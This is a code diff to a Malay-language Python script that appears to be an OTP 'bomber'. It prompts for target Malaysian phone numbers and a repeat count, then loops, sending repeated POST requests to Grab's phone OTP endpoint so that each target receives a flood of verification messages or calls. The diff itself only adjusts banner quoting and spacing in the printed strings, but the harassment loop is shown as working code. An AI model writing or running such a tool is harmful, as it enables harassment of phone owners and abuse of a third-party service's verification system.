@@ -31,7 +31,7 @@ print("""%s
  |       |   ))
 /| |   | |\_//	%sMASUKKAN NOMBOR DENGAN "60" (EX: 601XXXXXXX)%s
 \| |._.| |/-’
- '"'   '"'"""
+ '"'   '"'
 <NOTE> Kalu ERROR @ BUG dan lain-lain, silalah hubungi bapak saya.."""%(c,r,g,r,g,r,g,r,g,r,w,r))
 print("%s[*] Klik ENTER untuk step seterusnya%s"%(g,g))
 no1 = input("[?] NO.TARGET 1 => %s"%(w))
@@ -50,9 +50,9 @@ try:
 	print()
 	print("%s[-] RESULT:"%(r))
 	for i in range(jlmh):
-		print("%s⏳ PLEASE WAIT..."%(w))
+		print("%s⏳  PLEASE WAIT..."%(w))
 		time.sleep(1)
-		print("%s📲 CALLING..."%(w))
+		print("%s📲  CALLING..."%(w))
 		idk=("challengeID")
 		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
 		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
